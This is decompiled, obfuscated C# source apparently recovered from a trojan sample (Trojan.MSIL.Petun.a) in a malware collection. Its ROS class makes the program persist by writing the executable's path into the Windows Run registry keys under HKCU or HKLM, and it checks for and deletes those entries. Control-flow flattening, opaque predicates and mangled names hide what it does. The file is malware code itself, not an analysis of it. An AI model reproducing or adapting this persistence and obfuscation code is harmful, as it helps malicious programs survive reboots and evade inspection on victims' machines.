// Decompiled with JetBrains decompiler
// Type: ROS
// Assembly: test1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E8116EE9-6C79-4180-A1B1-1330F6BC88B7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Petun.a-47e879175f4baac8d24e5f7eba026a7e6b2e35fefbd029453110345a2057ecce.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[StandardModule]
internal sealed class ROS
{
  [MethodImpl(MethodImplOptions.NoInlining)]
  public static bool get_Runonstartup(string CommandLine = null, ROS.StartupCheckCriteria Criteria = ROS.StartupCheckCriteria.Either)
  {
    int num1 = 4;
    if (!ROS.ufVR2TCoduBcO36iIVG())
      goto label_12;
label_1:
    RegistryKey registryKey;
    ROS.\u00312BuvcCfOlorWK3Apis((object) registryKey);
    num1 = 14;
label_12:
    string[] strArray;
    string str1;
    int index;
    bool runonstartup1;
    string str2;
    bool runonstartup2;
    while (true)
    {
      switch (num1)
      {
        case 0:
label_21:
          str2 = (string) ROS.ixvN6aCxPr1ci85bSaP(ROS.qdD90eChGF7o3foqhke(ROS.\u0031OxlqCCZyQkBGRYJ412(), (object) " ", (object) CommandLine));
          ROS.\u0035hqc8pCLnSas8tbdtCg();
          if (ROS.ufVR2TCoduBcO36iIVG())
          {
            if (!ROS.ufVR2TCoduBcO36iIVG())
            {
              num1 = 1;
              continue;
            }
            goto case 8;
          }
          else
          {
            if (true)
            {
              num1 = 10;
              continue;
            }
            goto case 6;
          }
        case 1:
        case 3:
          strArray = (string[]) ROS.h9aPyLC7jEnDwSCGvQ8((object) registryKey);
          if (!ROS.ufVR2TCoduBcO36iIVG())
          {
            num1 = 17;
            continue;
          }
          goto case 6;
        case 2:
        case 10:
          if (Criteria == ROS.StartupCheckCriteria.NameOnly)
            goto case 6;
          else
            goto case 1;
        case 4:
          registryKey = (RegistryKey) ROS.VTASPsCpEe3Gs5wqIWI((object) Registry.CurrentUser, (object) "Software\\Microsoft\\Windows\\CurrentVersion\\pfLUUTYJ", true);
          if (ROS.\u0035hqc8pCLnSas8tbdtCg())
          {
            num1 = 0;
            continue;
          }
          goto case 16;
        case 5:
          ROS.GTu1uWCbuwhtTOft28R((object) registryKey, (object) str1);
          num1 = 19;
          continue;
        case 6:
        case 20:
          if (Criteria != ROS.StartupCheckCriteria.PathOnly)
          {
            num1 = 8;
            continue;
          }
          goto label_1;
        case 7:
          runonstartup1 = true;
          goto case 6;
        case 8:
          if (ROS.Wes2n1C3c9kGLPL9JnV(ROS.h9aPyLC7jEnDwSCGvQ8((object) registryKey), ROS.\u0031soUc6CIKDKJpIgj9lc()))
          {
            num1 = 9;
            continue;
          }
          goto label_1;
        case 9:
          if (ROS.KKYuq4CmNpVLwU0iJBj(ROS.wJihvVCXGhwFMpI67Mx((object) registryKey, ROS.\u0031soUc6CIKDKJpIgj9lc()), (object) str2, false))
          {
            num1 = 18;
            continue;
          }
          goto case 11;
        case 11:
          runonstartup2 = true;
          num1 = 13;
          continue;
        case 12:
        case 21:
          if (index >= strArray.Length)
          {
            num1 = 20;
            continue;
          }
          str1 = strArray[index];
          int num2 = 15;
          num1 = ROS.ufVR2TCoduBcO36iIVG() ? num2 : num2;
          continue;
        case 13:
          goto label_1;
        case 14:
          switch (Criteria)
          {
            case ROS.StartupCheckCriteria.Either:
              goto label_35;
            case ROS.StartupCheckCriteria.PathOnly:
              goto label_37;
            case ROS.StartupCheckCriteria.NameOnly:
              goto label_36;
            case ROS.StartupCheckCriteria.Both:
              goto label_34;
            default:
              if (true)
              {
                num1 = 22;
                continue;
              }
              goto label_21;
          }
        case 15:
          if (!ROS.WrjEXWCSgWjSvgM4LQJ(ROS.wJihvVCXGhwFMpI67Mx((object) registryKey, (object) str1), (object) str2, false))
          {
            checked { ++index; }
            num1 = 21;
            continue;
          }
          num1 = 16;
          continue;
        case 16:
          if (ROS.eT0hySCn0CFpALbWi4I((object) str1, ROS.K97uOMCMsQBUb3edmFO(ROS.MrcxU1CcW4sj7jn60tc(ROS.TSCUtBCBkWyD9mPL3IR())), false) != 0)
          {
            num1 = 5;
            continue;
          }
          goto case 7;
        case 17:
          index = 0;
          num1 = 12;
          continue;
        case 18:
          ROS.l3X48yCkfoyLucx0lOT((object) registryKey, ROS.\u0031soUc6CIKDKJpIgj9lc(), (object) str2);
          num1 = 11;
          continue;
        case 19:
          ROS.l3X48yCkfoyLucx0lOT((object) registryKey, ROS.\u0031soUc6CIKDKJpIgj9lc(), (object) str2);
          if (true)
          {
            num1 = 7;
            continue;
          }
          goto case 2;
        case 22:
          goto label_38;
        default:
          if (true)
          {
            num1 = 6;
            continue;
          }
          goto case 19;
      }
    }
label_34:
    return runonstartup1 & runonstartup2;
label_35:
    return runonstartup1 | runonstartup2;
label_36:
    return runonstartup1;
label_37:
    return runonstartup2;
label_38:
    return false;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void set_Runonstartup(
    string CommandLine = null,
    ROS.StartupCheckCriteria Criteria = ROS.StartupCheckCriteria.Either,
    bool value)
  {
    int num = 4;
    if (ROS.ufVR2TCoduBcO36iIVG())
      ;
label_8:
    RegistryKey registryKey;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 1:
          registryKey = (RegistryKey) ROS.VTASPsCpEe3Gs5wqIWI((object) Registry.CurrentUser, (object) "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (true)
          {
            num = 3;
            continue;
          }
          goto case 4;
        case 2:
        case 5:
          ROS.\u00312BuvcCfOlorWK3Apis((object) registryKey);
          num = 10;
          continue;
        case 3:
        case 9:
          while (value)
          {
            if (true)
            {
              num = 8;
              goto label_8;
            }
          }
          if (!ROS.Wes2n1C3c9kGLPL9JnV(ROS.h9aPyLC7jEnDwSCGvQ8((object) registryKey), ROS.\u0031soUc6CIKDKJpIgj9lc()))
            goto case 2;
          else
            goto case 6;
        case 4:
          if (ROS.eT0hySCn0CFpALbWi4I(Module1.doGVcenLG, (object) "CurrentUser", false) == 0)
          {
            ROS.ufVR2TCoduBcO36iIVG();
            if (ROS.\u0035hqc8pCLnSas8tbdtCg())
            {
              num = 0;
              continue;
            }
            if (true)
            {
              num = 7;
              continue;
            }
            goto case 2;
          }
          else
          {
            registryKey = (RegistryKey) ROS.VTASPsCpEe3Gs5wqIWI((object) Registry.LocalMachine, (object) "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (true)
            {
              num = 9;
              continue;
            }
            goto case 2;
          }
        case 6:
        case 7:
          ROS.GTu1uWCbuwhtTOft28R((object) registryKey, ROS.\u0031soUc6CIKDKJpIgj9lc());
          num = 5;
          continue;
        case 8:
          ROS.l3X48yCkfoyLucx0lOT((object) registryKey, ROS.K97uOMCMsQBUb3edmFO(ROS.MrcxU1CcW4sj7jn60tc(ROS.TSCUtBCBkWyD9mPL3IR())), ROS.ixvN6aCxPr1ci85bSaP(ROS.qdD90eChGF7o3foqhke(ROS.\u0031OxlqCCZyQkBGRYJ412(), (object) " ", (object) CommandLine)));
          goto case 2;
        case 10:
          goto label_15;
        default:
          num = 2;
          continue;
      }
    }
label_15:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static bool InArray(object Arr, object Str)
  {
    int num1 = 1;
label_4:
    bool flag;
    while (true)
    {
      int num2;
      int num3;
      switch (num1)
      {
        case 0:
        case 5:
        case 6:
          while (num3 <= num2)
          {
            if (ROS.WrjEXWCSgWjSvgM4LQJ(ROS.SkrUWgCVRJtd4h8B4JD(Arr, (object) new object[1]
            {
              (object) num3
            }, (object) null), Str, false))
            {
              if (!ROS.ufVR2TCoduBcO36iIVG())
              {
                num1 = 3;
                goto label_4;
              }
              else
                goto label_12;
            }
            else
              checked { ++num3; }
          }
          num1 = 8;
          continue;
        case 1:
          flag = false;
          num1 = 7;
          continue;
        case 2:
        case 4:
        case 8:
          goto label_12;
        case 3:
          flag = true;
          break;
        case 7:
          num2 = ROS.pMX3rMCJZM8yM8af39D(Arr, 1);
          num3 = 0;
          num1 = 0;
          continue;
      }
      ROS.ufVR2TCoduBcO36iIVG();
      num1 = !ROS.\u0035hqc8pCLnSas8tbdtCg() ? 6 : 2;
    }
label_12:
    return flag;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object VTASPsCpEe3Gs5wqIWI([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0031OxlqCCZyQkBGRYJ412() => (object) Application.ExecutablePath;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object qdD90eChGF7o3foqhke([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object ixvN6aCxPr1ci85bSaP([In] object obj0) => (object) Strings.Trim((string) obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object h9aPyLC7jEnDwSCGvQ8([In] object obj0) => (object) ((RegistryKey) obj0).GetValueNames();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object wJihvVCXGhwFMpI67Mx([In] object obj0, [In] object obj1) => ((RegistryKey) obj0).GetValue((string) obj1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool WrjEXWCSgWjSvgM4LQJ([In] object obj0, [In] object obj1, [In] bool obj2) => Operators.ConditionalCompareObjectEqual(obj0, obj1, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object TSCUtBCBkWyD9mPL3IR() => (object) MyProject.Application;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object MrcxU1CcW4sj7jn60tc([In] object obj0) => (object) ((ApplicationBase) obj0).Info;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object K97uOMCMsQBUb3edmFO([In] object obj0) => (object) ((AssemblyInfo) obj0).ProductName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int eT0hySCn0CFpALbWi4I([In] object obj0, [In] object obj1, [In] bool obj2) => Operators.CompareString((string) obj0, (string) obj1, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void GTu1uWCbuwhtTOft28R([In] object obj0, [In] object obj1) => ((RegistryKey) obj0).DeleteValue((string) obj1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0031soUc6CIKDKJpIgj9lc() => (object) Application.ProductName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void l3X48yCkfoyLucx0lOT([In] object obj0, [In] object obj1, [In] object obj2) => ((RegistryKey) obj0).SetValue((string) obj1, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool Wes2n1C3c9kGLPL9JnV([In] object obj0, [In] object obj1) => ROS.InArray(obj0, obj1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool KKYuq4CmNpVLwU0iJBj([In] object obj0, [In] object obj1, [In] bool obj2) => Operators.ConditionalCompareObjectNotEqual(obj0, obj1, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u00312BuvcCfOlorWK3Apis([In] object obj0) => ((RegistryKey) obj0).Close();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0035hqc8pCLnSas8tbdtCg() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool ufVR2TCoduBcO36iIVG() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int pMX3rMCJZM8yM8af39D([In] object obj0, [In] int obj1) => Information.UBound((Array) obj0, obj1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object SkrUWgCVRJtd4h8B4JD([In] object obj0, [In] object obj1, [In] object obj2) => NewLateBinding.LateIndexGet(obj0, (object[]) obj1, (string[]) obj2);

  public enum StartupCheckCriteria
  {
    Either,
    PathOnly,
    NameOnly,
    Both,
  }
}
